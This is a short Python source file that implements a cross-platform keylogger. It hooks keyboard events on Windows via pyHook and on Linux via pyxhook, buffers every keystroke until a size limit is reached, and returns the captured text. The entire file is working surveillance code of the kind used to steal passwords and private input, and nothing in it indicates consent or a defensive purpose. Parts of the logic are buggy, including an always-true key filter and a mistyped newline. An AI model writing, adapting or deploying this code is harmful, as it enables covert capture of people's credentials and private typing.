import sys
import os, subprocess

keysPressed = ">"


def onkeyboardevent(event):
    global keysPressed
    if event.Ascii != 0 or 8:
        keysPressed += chr(event.Ascii)
    if event.Ascii == 13:
        keysPressed += "/n"
    return True


def keylogger(size):
    if os.name == "nt":
        import win32api
        import pythoncom
        from pyHook import HookManager
    else:
        p = subprocess.Popen(["echo $DISPLAY"], shell=True, stdout=subprocess.PIPE)
        output, err = p.communicate()
        if len(str(output).strip()) == 0:
            return "Display not found"
        else:
            import pyxhook
            from pyxhook import HookManager
    global keysPressed
    hm = HookManager()
    hm.KeyDown = onkeyboardevent
    hm.HookKeyboard()
    if os.name != "nt":
        hm.start()
    while len(keysPressed) < int(size):
        if os.name == "nt":
            pythoncom.PumpWaitingMessages()
    else:
        keys = keysPressed
        keysPressed = ">"
        if os.name == "nt":
            hm.UnhookKeyboard()
        else:
            hm.cancel()
        return keys
